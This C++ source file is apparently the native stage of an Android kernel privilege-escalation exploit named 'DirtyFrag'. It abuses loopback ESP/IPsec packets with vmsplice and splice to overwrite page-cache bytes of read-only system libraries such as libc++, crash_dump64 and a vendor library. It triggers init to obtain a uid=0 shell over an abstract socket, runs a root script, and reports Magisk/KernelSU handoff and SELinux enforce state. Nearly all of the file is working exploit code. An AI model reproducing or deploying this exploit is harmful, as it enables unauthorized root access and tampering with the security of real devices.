/*
 * Second way (DirtyFrag hybrid), native half.
 *
 * The app owns the IpSec transform and every cryptographic detail: it reads the
 * current 16-byte blocks of libc++, computes IV = AES_ECB_DEC(key, old) XOR
 * desired, and writes them to the control file. This unit only
 *   - sends each patch/restore packet (SPI|Seq|IV + the file page, spliced),
 *   - triggers init by orphaning a child,
 *   - connects to the stub's abstract socket and runs the root script.
 *
 * No kernel state is written here; no AES is needed.
 */

#include "session/dirtyfrag_stage.hpp"
#include "session/dirtyfrag_verdict.hpp"
#include "session/runtime_config.h"

#include <cerrno>
#include <chrono>
#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <fcntl.h>
#include <netinet/in.h>
#include <poll.h>
#include <arpa/inet.h>
#include <string>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <unistd.h>
#include <vector>

namespace ghostlock::session {
    namespace {
        struct dirty_entry final {
            off_t offset;
            uint8_t iv[16];
        };

        struct dirty_plan final {
            std::string lib;
            std::string socket_name;
            int32_t sender_port = 0;
            int32_t encap_port = 0;
            uint32_t spi = 0;
            std::vector<dirty_entry> patch;
            std::vector<dirty_entry> restore;
            /* Module pipeline: the crash_dump bridge. `aux_lib` is crash_dump64;
             * aux_patch installs the helper (a separate aux-install run),
             * aux_restore removes it; `vendor_lib` is the vendor_file target,
             * whose bytes are delivered through the bridge (one splice feeds
             * every vendor patch packet). */
            std::string aux_lib;
            std::vector<dirty_entry> aux_patch;
            std::vector<dirty_entry> aux_restore;
            bool aux_installed = false;
            std::string bridge;
            std::string vendor_lib;
            uint64_t vendor_len = 0;
            std::vector<dirty_entry> vendor_patch;
        };

        bool parse_hex16(const char *text, uint8_t out[16]) {
            if (std::strlen(text) != 32) return false;
            for (std::size_t i = 0; i < 16; i++) {
                const std::size_t index = i * 2;
                char byte[3] = {text[index], text[index + 1], '\0'};
                char *end = nullptr;
                const unsigned long value = std::strtoul(byte, &end, 16);
                if (end != byte + 2) return false;
                out[i] = static_cast<uint8_t>(value);
            }
            return true;
        }

        bool load_plan(const char *path, dirty_plan *plan) {
            FILE *file = std::fopen(path, "re");
            if (file == nullptr) {
                std::fprintf(stderr, "dirtyfrag: cannot open control file %s errno=%d\n", path, errno);
                return false;
            }
            char line[512];
            while (std::fgets(line, sizeof(line), file) != nullptr) {
                char *save = nullptr;
                const char *key = strtok_r(line, " \t\r\n", &save);
                if (key == nullptr) continue;
                if (std::strcmp(key, "lib") == 0) {
                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
                    if (value != nullptr) plan->lib = value;
                } else if (std::strcmp(key, "sender") == 0) {
                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
                    if (value != nullptr) plan->sender_port = std::atoi(value);
                } else if (std::strcmp(key, "encap") == 0) {
                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
                    if (value != nullptr) plan->encap_port = std::atoi(value);
                } else if (std::strcmp(key, "spi") == 0) {
                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
                    if (value != nullptr) plan->spi = static_cast<uint32_t>(std::strtoul(value, nullptr, 10));
                } else if (std::strcmp(key, "socket") == 0) {
                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
                    if (value != nullptr) plan->socket_name = value;
                } else if (std::strcmp(key, "alib") == 0) {
                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
                    if (value != nullptr) plan->aux_lib = value;
                } else if (std::strcmp(key, "bridge") == 0) {
                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
                    if (value != nullptr) plan->bridge = value;
                } else if (std::strcmp(key, "vlib") == 0) {
                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
                    if (value != nullptr) plan->vendor_lib = value;
                } else if (std::strcmp(key, "vlen") == 0) {
                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
                    if (value != nullptr) {
                        plan->vendor_len = static_cast<uint64_t>(std::strtoull(value, nullptr, 10));
                    }
                } else if (std::strcmp(key, "auxinstalled") == 0) {
                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
                    plan->aux_installed = value != nullptr && std::atoi(value) != 0;
                } else if (std::strcmp(key, "patch") == 0 || std::strcmp(key, "restore") == 0 ||
                           std::strcmp(key, "apatch") == 0 || std::strcmp(key, "arestore") == 0 ||
                           std::strcmp(key, "vpatch") == 0) {
                    const char *off = strtok_r(nullptr, " \t\r\n", &save);
                    const char *iv = strtok_r(nullptr, " \t\r\n", &save);
                    dirty_entry entry{};
                    if (off == nullptr || iv == nullptr ||
                        !parse_hex16(iv, entry.iv)) {
                        std::fprintf(stderr, "dirtyfrag: bad %s entry\n", key);
                        std::fclose(file);
                        return false;
                    }
                    entry.offset = static_cast<off_t>(std::strtoll(off, nullptr, 10));
                    std::vector<dirty_entry> *target = nullptr;
                    if (std::strcmp(key, "patch") == 0) target = &plan->patch;
                    else if (std::strcmp(key, "restore") == 0) target = &plan->restore;
                    else if (std::strcmp(key, "apatch") == 0) target = &plan->aux_patch;
                    else if (std::strcmp(key, "arestore") == 0) target = &plan->aux_restore;
                    else target = &plan->vendor_patch;
                    target->push_back(entry);
                }
            }
            std::fclose(file);
            if (plan->lib.empty() || plan->socket_name.empty() ||
                plan->sender_port <= 0 || plan->encap_port <= 0) {
                std::fprintf(stderr, "dirtyfrag: incomplete control file\n");
                return false;
            }
            return true;
        }

        /* One stable, page-aligned header slot per packet.
         *
         * The packet's 24-byte ESP header must not be reused: the skb keeps a
         * pipe reference to the page and the ESP input reads it when the
         * loopback softirq processes the packet, which can be after the stage
         * has moved on. A stack buffer is overwritten by the next packet; with
         * a burst (the module's ~850 packets) that leaves the queued headers
         * holding the last write, so the SA lookup/decrypt sees the wrong
         * sequence/IV and the block is dropped. The reference's one-process-per-
         * block cadence masked this. */
        uint8_t *header_slot() {
            constexpr std::size_t kSlot = 4096;
            constexpr std::size_t kSlots = 4096; // 16 MiB: enough for the largest plan
            static uint8_t *arena = nullptr;
            static std::size_t used = 0;
            if (arena == nullptr) {
                void *mapped = mmap(nullptr, kSlot * kSlots, PROT_READ | PROT_WRITE,
                                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
                if (mapped == MAP_FAILED) return nullptr;
                arena = static_cast<uint8_t *>(mapped);
            }
            if (used >= kSlots) return nullptr;
            return arena + (used++) * kSlot;
        }

        int send_one(int socket_fd, int file_fd, const dirty_entry &entry, uint32_t spi,
                     uint32_t sequence) {
            uint8_t header[24];
            const uint32_t spi_be = htonl(spi);
            const uint32_t seq_be = htonl(sequence);
            std::memcpy(header, &spi_be, 4);
            std::memcpy(header + 4, &seq_be, 4);
            std::memcpy(header + 8, entry.iv, 16);

            int pipe_fds[2];
            if (pipe(pipe_fds) < 0) return -errno;
            uint8_t *slot = header_slot();
            if (slot == nullptr) {
                close(pipe_fds[0]);
                close(pipe_fds[1]);
                return -ENOMEM;
            }
            std::memcpy(slot, header, sizeof(header));
            struct iovec iov{};
            iov.iov_base = slot;
            iov.iov_len = sizeof(header);
            if (vmsplice(pipe_fds[1], &iov, 1, 0) != 24) {
                const int err = -errno;
                close(pipe_fds[0]);
                close(pipe_fds[1]);
                return err;
            }
            loff_t offset = entry.offset;
            if (splice(file_fd, &offset, pipe_fds[1], nullptr, 16, SPLICE_F_MOVE) != 16) {
                const int err = -errno;
                close(pipe_fds[0]);
                close(pipe_fds[1]);
                return err;
            }
            const ssize_t sent = splice(pipe_fds[0], nullptr, socket_fd, nullptr, 40, 0);
            const int result = (sent == 40) ? 0 : (sent < 0 ? -errno : -1000);
            close(pipe_fds[0]);
            close(pipe_fds[1]);
            return result;
        }

        /* The module pipeline's vendor delivery: one helper invocation splices
         * the whole vendor range into a pipe; each packet then takes its 16
         * bytes from that pipe (the page reference survives pipe-to-pipe), so
         * the app never needs read/write access to vendor_file itself. */
        int send_vendor_range(int socket_fd, const dirty_plan &plan, uint32_t spi,
                              uint32_t &sequence) {
            if (plan.vendor_patch.empty()) return 0;
            if (plan.bridge.empty() || plan.vendor_lib.empty() || plan.vendor_len == 0) return -1;
            int feed[2];
            if (pipe(feed) < 0) return -errno;
            const pid_t pid = fork();
            if (pid == 0) {
                if (dup2(feed[1], 1) < 0) _exit(1);
                close(feed[0]);
                close(feed[1]);
                char len_text[24];
                std::snprintf(len_text, sizeof(len_text), "%llu",
                              static_cast<unsigned long long>(plan.vendor_len));
                execl(plan.bridge.c_str(), "crashdump64", "0", plan.vendor_lib.c_str(), "s",
                      len_text, static_cast<char *>(nullptr));
                _exit(1);
            }
            close(feed[1]);
            if (pid < 0) {
                close(feed[0]);
                return -errno;
            }
            int32_t result = 0;
            for (const dirty_entry &entry : plan.vendor_patch) {
                uint8_t header[24];
                const uint32_t spi_be = htonl(spi);
                const uint32_t seq_be = htonl(sequence);
                std::memcpy(header, &spi_be, 4);
                std::memcpy(header + 4, &seq_be, 4);
                std::memcpy(header + 8, entry.iv, 16);
                int packet[2];
                if (pipe(packet) < 0) {
                    result = -errno;
                    break;
                }
                uint8_t *slot = header_slot();
                if (slot == nullptr) {
                    result = -ENOMEM;
                    close(packet[0]);
                    close(packet[1]);
                    break;
                }
                std::memcpy(slot, header, sizeof(header));
                struct iovec iov{};
                iov.iov_base = slot;
                iov.iov_len = sizeof(header);
                if (vmsplice(packet[1], &iov, 1, 0) != 24 ||
                    splice(feed[0], nullptr, packet[1], nullptr, 16, SPLICE_F_MOVE) != 16) {
                    result = -errno;
                    close(packet[0]);
                    close(packet[1]);
                    break;
                }
                const ssize_t sent = splice(packet[0], nullptr, socket_fd, nullptr, 40, 0);
                close(packet[0]);
                close(packet[1]);
                if (sent != 40) {
                    result = sent < 0 ? -errno : -1000;
                    break;
                }
                sequence++;
                /* The encapsulated ESP packets are processed asynchronously;
                 * the encap socket's receive buffer is finite. The reference's
                 * per-block process spawn paced this naturally; a tight burst
                 * overflows the queue and the later blocks are dropped. */
                if ((sequence % 96) == 0) usleep(10 * 1000);
            }
            close(feed[0]);
            int32_t status = 0;
            waitpid(pid, &status, 0);
            if (result == 0 && (!WIFEXITED(status) || WEXITSTATUS(status) != 0)) result = -1001;
            return result;
        }

        int open_sender(const dirty_plan &plan) {
            const int fd = socket(AF_INET, SOCK_DGRAM, 0);
            if (fd < 0) return -1;
            int one = 1;
            setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
            struct sockaddr_in source{};
            source.sin_family = AF_INET;
            source.sin_port = htons(static_cast<uint16_t>(plan.sender_port));
            source.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
            if (bind(fd, reinterpret_cast<struct sockaddr *>(&source), sizeof(source)) < 0) {
                close(fd);
                return -1;
            }
            struct sockaddr_in target{};
            target.sin_family = AF_INET;
            target.sin_port = htons(static_cast<uint16_t>(plan.encap_port));
            target.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
            if (connect(fd, reinterpret_cast<struct sockaddr *>(&target), sizeof(target)) < 0) {
                close(fd);
                return -1;
            }
            return fd;
        }

        void trigger_orphan(void) {
            const pid_t pid = fork();
            if (pid == 0) {
                const pid_t grandchild = fork();
                if (grandchild == 0) {
                    sleep(1);
                    _exit(0);
                }
                _exit(0);
            }
            if (pid > 0) {
                int32_t status = 0;
                waitpid(pid, &status, 0);
            }
        }

        int connect_socket(const std::string &name, int32_t timeout_ms) {
            for (int32_t waited = 0; waited < timeout_ms; waited += 50) {
                const int fd = socket(AF_UNIX, SOCK_STREAM, 0);
                if (fd < 0) return -1;
                struct sockaddr_un address{};
                address.sun_family = AF_UNIX;
                address.sun_path[0] = '\0';
                std::size_t length = name.size();
                if (length > sizeof(address.sun_path) - 1) length = sizeof(address.sun_path) - 1;
                std::memcpy(address.sun_path + 1, name.data(), length);
                const socklen_t address_length = static_cast<socklen_t>(
                    offsetof(struct sockaddr_un, sun_path) + 1 + length);
                if (connect(fd, reinterpret_cast<struct sockaddr *>(&address), address_length) == 0) {
                    return fd;
                }
                close(fd);
                usleep(50 * 1000);
            }
            return -1;
        }

        std::string read_until(int fd, int32_t timeout_ms, const char *stop) {
            std::string out;
            const auto deadline = std::chrono::steady_clock::now() + std::chrono::milliseconds(timeout_ms);
            char buffer[512];
            while (std::chrono::steady_clock::now() < deadline) {
                struct pollfd pfd{};
                pfd.fd = fd;
                pfd.events = POLLIN;
                const int ready = poll(&pfd, 1, 200);
                if (ready <= 0) continue;
                const ssize_t count = read(fd, buffer, sizeof(buffer));
                if (count <= 0) break;
                out.append(buffer, static_cast<std::size_t>(count));
                if (stop != nullptr && out.find(stop) != std::string::npos) break;
            }
            return out;
        }

        void print_log_tail(const std::string &path) {
            const int fd = open(path.c_str(), O_RDONLY);
            if (fd < 0) {
                std::printf("dirtyfrag: ksu-log absent path=%s\n", path.c_str());
                return;
            }
            const off_t size = lseek(fd, 0, SEEK_END);
            const off_t start = size > 4096 ? size - 4096 : 0;
            if (lseek(fd, start, SEEK_SET) >= 0) {
                std::string tail;
                char buffer[512];
                ssize_t count;
                while ((count = read(fd, buffer, sizeof(buffer))) > 0) {
                    tail.append(buffer, static_cast<std::size_t>(count));
                }
                std::printf("dirtyfrag: ksu-log=%s\n%s", path.c_str(), tail.c_str());
            }
            close(fd);
        }
    } // namespace

    int run_dirtyfrag_stage(const char *control_path, const char *mode) {
        /* The stage is a second native invocation; the exploit session's
         * `[T+ms]` clock does not exist here. A local clock from the function
         * start makes the stage measurable without the app's wall. */
        const auto stage_t0 = std::chrono::steady_clock::now();
        const auto stage_ms = [&stage_t0]() {
            return std::chrono::duration_cast<std::chrono::milliseconds>(
                       std::chrono::steady_clock::now() - stage_t0)
                .count();
        };
        dirty_plan plan{};
        if (!load_plan(control_path, &plan)) return 1;
        /* Step 1 of the module pipeline: install the crash_dump helper only. */
        if (mode != nullptr && std::strcmp(mode, "aux-install") == 0) {
            if (plan.aux_lib.empty() || plan.aux_patch.empty()) {
                std::fprintf(stderr, "dirtyfrag: aux-install: no aux plan\n");
                return 1;
            }
            const int aux_fd = open(plan.aux_lib.c_str(), O_RDONLY);
            if (aux_fd < 0) {
                std::fprintf(stderr, "dirtyfrag: aux-install: cannot open %s errno=%d\n",
                             plan.aux_lib.c_str(), errno);
                return 1;
            }
            const int aux_sender = open_sender(plan);
            if (aux_sender < 0) {
                close(aux_fd);
                std::fprintf(stderr, "dirtyfrag: aux-install: sender socket failed errno=%d\n", errno);
                return 1;
            }
            uint32_t aux_sequence = 1;
            int32_t aux_rc = 0;
            for (const dirty_entry &entry : plan.aux_patch) {
                const int result = send_one(aux_sender, aux_fd, entry, plan.spi, aux_sequence++);
                if (result != 0) {
                    aux_rc = result;
                    break;
                }
            }
            close(aux_sender);
            close(aux_fd);
            std::printf("dirtyfrag: aux-install blocks=%zu rc=%d\n", plan.aux_patch.size(), aux_rc);
            return aux_rc == 0 ? 0 : 1;
        }
        const bool no_shell = (mode != nullptr && std::strcmp(mode, "noshell") == 0);
        const bool no_script = (mode != nullptr && std::strcmp(mode, "noscript") == 0);
        /* Diagnostic A/B arm: the old behaviour (restore after the root
         * script) instead of the product's early restore. */
        const bool late_restore = (mode != nullptr && std::strcmp(mode, "laterestore") == 0);
        std::printf("dirtyfrag: T+%lldms plan lib=%s patch=%zu restore=%zu socket=@%s mode=%s\n",
                    static_cast<long long>(stage_ms()), plan.lib.c_str(), plan.patch.size(),
                    plan.restore.size(), plan.socket_name.c_str(),
                    mode != nullptr ? mode : "full");

        const int file_fd = open(plan.lib.c_str(), O_RDONLY);
        if (file_fd < 0) {
            std::fprintf(stderr, "dirtyfrag: cannot open %s errno=%d\n", plan.lib.c_str(), errno);
            return 1;
        }
        const int sender = open_sender(plan);
        if (sender < 0) {
            std::fprintf(stderr, "dirtyfrag: sender socket failed errno=%d\n", errno);
            close(file_fd);
            return 1;
        }

        /* One monotonic sequence for every packet of this stage. The install
         * run already used 1..N on the same SA; a high base keeps the replay
         * window from treating the main run's packets as duplicates. */
        uint32_t sequence = 100000;
        bool ok = true;
        /* Module pipeline: the vendor target first (through the bridge that the
         * aux-install run left in crash_dump64), then remove the bridge, then
         * the libc++ stub. The vendor file stays patched until reboot (an
         * unused vendor library; the bridge is restored). */
        if (!plan.vendor_patch.empty()) {
            const int vendor_rc = send_vendor_range(sender, plan, plan.spi, sequence);
            std::printf("dirtyfrag: T+%lldms vendor blocks=%zu rc=%d\n",
                        static_cast<long long>(stage_ms()), plan.vendor_patch.size(), vendor_rc);
            if (vendor_rc != 0) ok = false;
            /* Let the encap queue drain before the bridge restore and the
             * libc++ stub share the same queue. */
            if (ok) usleep(30 * 1000);
        }
        if (ok && plan.aux_installed && !plan.aux_restore.empty()) {
            const int aux_fd = open(plan.aux_lib.c_str(), O_RDONLY);
            if (aux_fd >= 0) {
                for (const dirty_entry &entry : plan.aux_restore) {
                    if (send_one(sender, aux_fd, entry, plan.spi, sequence++) != 0) {
                        ok = false;
                        break;
                    }
                }
                close(aux_fd);
                std::printf("dirtyfrag: T+%lldms aux restored\n", static_cast<long long>(stage_ms()));
            } else {
                std::fprintf(stderr, "dirtyfrag: aux restore: cannot open %s errno=%d\n",
                             plan.aux_lib.c_str(), errno);
                ok = false;
            }
        }
        for (const dirty_entry &entry : plan.patch) {
            const int result = send_one(sender, file_fd, entry, plan.spi, sequence++);
            if (result != 0) {
                std::fprintf(stderr, "dirtyfrag: patch offset=%lld failed %d\n",
                             static_cast<long long>(entry.offset), result);
                ok = false;
                break;
            }
        }
        if (ok) std::printf("dirtyfrag: T+%lldms patched %zu blocks\n", static_cast<long long>(stage_ms()), plan.patch.size());

        const auto dump_block = [&](const char *label, const dirty_entry &entry) {
            uint8_t block[16];
            if (pread(file_fd, block, sizeof(block), entry.offset) == 16) {
                std::printf("dirtyfrag: readback %s base=%lld bytes=%02x%02x%02x%02x%02x%02x%02x%02x"
                            "%02x%02x%02x%02x%02x%02x%02x%02x\n",
                            label, static_cast<long long>(entry.offset),
                            block[0], block[1], block[2], block[3], block[4], block[5],
                            block[6], block[7], block[8], block[9], block[10], block[11],
                            block[12], block[13], block[14], block[15]);
            }
        };
        /* Read back the page cache through the same file: the ESP write is the
         * only writer, so these bytes prove whether the patch landed. */
        if (ok && !plan.patch.empty()) {
            dump_block("cave-first", plan.patch.front());
            dump_block("hook-last", plan.patch.back());
        }

        /* The stub is one-shot: once the shell is connected no new process
         * needs the patched pages. Restore here, before the root script, so
         * the init-hook/page-cache window is only the patch + connect
         * interval. It also runs when the shell failed, so a failed trigger
         * does not leave libc++ patched. */
        bool restored = false;
        const auto restore_blocks = [&]() {
            bool restore_ok = true;
            for (const dirty_entry &entry : plan.restore) {
                const int result = send_one(sender, file_fd, entry, plan.spi, sequence++);
                if (result != 0) {
                    std::fprintf(stderr, "dirtyfrag: restore offset=%lld failed %d\n",
                                 static_cast<long long>(entry.offset), result);
                    restore_ok = false;
                }
            }
            std::printf("dirtyfrag: T+%lldms restored %zu blocks ok=%d\n", static_cast<long long>(stage_ms()), plan.restore.size(), restore_ok ? 1 : 0);
            if (!plan.restore.empty()) {
                dump_block("restore-first", plan.restore.front());
                dump_block("restore-last", plan.restore.back());
            }
            restored = true;
            return restore_ok;
        };

        if (ok && no_shell) {
            ok = restore_blocks() && ok;
            close(sender);
            close(file_fd);
            std::printf("dirtyfrag: T+%lldms RESULT=%s (noshell)\n", static_cast<long long>(stage_ms()), ok ? "OK" : "FAIL");
            return ok ? 0 : 1;
        }

        int shell = -1;
        if (ok) {
            trigger_orphan();
            shell = connect_socket(plan.socket_name, 5000);
            if (shell < 0) {
                std::fprintf(stderr, "dirtyfrag: no shell (connect failed)\n");
                ok = false;
            }
        }

        bool shell_uid0 = false;
        if (shell >= 0) {
            const char *id_command = "id\n";
            if (write(shell, id_command, std::strlen(id_command)) < 0) ok = false;
            const std::string id_reply = read_until(shell, 2000, "\n");
            std::printf("dirtyfrag: T+%lldms shell=%s\n", static_cast<long long>(stage_ms()), id_reply.c_str());
            if (id_reply.find("uid=0") == std::string::npos) {
                std::fprintf(stderr, "dirtyfrag: shell is not uid=0\n");
                ok = false;
            } else {
                shell_uid0 = true;
            }
        }

        if (!restored && !late_restore) ok = restore_blocks() && ok;

        /* The root script's own verdict: `DFRC=` is its exit code, and a
         * failed root phase must not be read as success just because the shell
         * command returned. The SELinux state is read back over the same root
         * shell (the stub's domain differs per ROM: toolbox, oppo_shell): the
         * app process cannot read /sys/fs/selinux/enforce on every ROM. */
        int32_t script_rc = -1;
        std::string enforce_state = "unprobed";
        std::string script_output;
        if (ok && !no_script && shell_uid0) {
            const std::string script = config::runtime_config_snapshot().root_script_path;
            const std::string command = "sh '" + script + "'; echo DFRC=$?\n";
            if (write(shell, command.data(), command.size()) < 0) ok = false;
            script_output = read_until(shell, 30000, "DFRC=");
            const std::size_t marker = script_output.find("DFRC=");
            if (marker != std::string::npos && script_output.find('\n', marker) == std::string::npos) {
                /* The marker and its digits can arrive in separate reads. */
                script_output += read_until(shell, 500, "\n");
            }
            std::printf("dirtyfrag: T+%lldms script-output=%s\n", static_cast<long long>(stage_ms()), script_output.c_str());
            if (!dirtyfrag_verdict::parse_script_exit(script_output, &script_rc)) {
                std::fprintf(stderr, "dirtyfrag: root script did not finish\n");
                ok = false;
            } else if (script_rc != 0) {
                std::fprintf(stderr, "dirtyfrag: root script exited code=%d\n", script_rc);
                ok = false;
            }
        }

        /* The module pipeline's handoff is Magisk, not KernelSU: report it as
         * its own verdict line so the run log names the daemon, the policy
         * phase and the delivered target the way the KSU path names its
         * late-load. It is printed even when the init shell never connected,
         * so a handoff that did not happen is named as such. The final
         * enforce state still comes from RESULT. */
        if (!no_script && config::runtime_config_snapshot().handoff == "magisk") {
            dirtyfrag_verdict::MagiskSummary magisk{};
            const bool reported = shell_uid0 &&
                dirtyfrag_verdict::parse_magisk_summary(script_output, &magisk);
            const char *reason = !shell_uid0
                                     ? "no-shell"
                                     : (!reported ? "no-summary"
                                                  : (magisk.ready() ? "ok" : "magiskd-none"));
            const auto &runtime = config::runtime_config_snapshot();
            std::printf(
                "dirtyfrag: T+%lldms MAGISK-HANDOFF %s reason=%s magiskd=%s policy=%s "
                "policy_rc=%s enforce=%s bin=%s module=%s\n",
                static_cast<long long>(stage_ms()),
                magisk.ready() ? "ok" : "fail",
                reason,
                reported ? magisk.magiskd.c_str() : "none",
                reported ? magisk.policy.c_str() : "none",
                reported ? magisk.policy_rc.c_str() : "none",
                reported ? magisk.enforce.c_str() : "unknown",
                runtime.magisk_bin.c_str(),
                plan.vendor_lib.empty() ? "none" : plan.vendor_lib.c_str());
        }

        /* Probe after the script, whatever its verdict: a run whose root phase
         * left SELinux permissive is not success, and the RESULT line has to
         * carry the state the device keeps. */
        if (shell >= 0 && shell_uid0 && !no_script) {
            const char *probe =
                "e=$(cat /sys/fs/selinux/enforce 2>/dev/null); "
                "echo \"ENFORCE=${e:-unreadable}\"\n";
            if (write(shell, probe, std::strlen(probe)) < 0) {
                enforce_state = "unknown";
            } else {
                std::string reply = read_until(shell, 2000, "ENFORCE=");
                const std::size_t marker = reply.find("ENFORCE=");
                if (marker != std::string::npos && reply.find('\n', marker) == std::string::npos) {
                    reply += read_until(shell, 500, "\n");
                }
                if (!dirtyfrag_verdict::parse_enforce(reply, &enforce_state)) {
                    enforce_state = "unknown";
                }
            }
            if (enforce_state == "unreadable") {
                /* SELinux denies this read only when enforcing; a permissive
                 * device lets every domain read it. Same convention as the
                 * first way's handoff probe. */
                enforce_state = "1";
            }
            /* The script's restore report outranks the readback: the DirtyFrag
             * shell (toolbox) may set the enforce node but not read it, so the
             * successful write is the evidence. A restore that cannot be
             * confirmed is not success. */
            dirtyfrag_verdict::EnforceRestore restore{};
            if (dirtyfrag_verdict::parse_enforce_restore(script_output, &restore) && restore.present) {
                enforce_state = dirtyfrag_verdict::enforce_state_from_restore(restore);
                if (enforce_state != "1") {
                    std::fprintf(stderr, "dirtyfrag: SELinux restore not confirmed (enforce=%s)\n", enforce_state.c_str());
                    ok = false;
                }
            } else if (enforce_state == "0") {
                std::fprintf(stderr, "dirtyfrag: SELinux left permissive (enforce=0)\n");
                ok = false;
            }
        }

        if (!restored) ok = restore_blocks() && ok;

        if (shell >= 0) close(shell);
        /* The log tail is the only place a failed root phase names its cause;
         * print it for a failed run too, not only for a clean one. */
        if (!no_script) print_log_tail(config::runtime_config_snapshot().ksu_log_path);
        close(sender);
        close(file_fd);
        if (no_script) {
            std::printf("dirtyfrag: T+%lldms RESULT=%s (noscript)\n",
                        static_cast<long long>(stage_ms()), ok ? "OK" : "FAIL");
        } else {
            std::printf("dirtyfrag: T+%lldms RESULT=%s script=%d enforce=%s\n",
                        static_cast<long long>(stage_ms()), ok ? "OK" : "FAIL",
                        script_rc, enforce_state.c_str());
        }
        return ok ? 0 : 1;
    }
} // namespace ghostlock::session
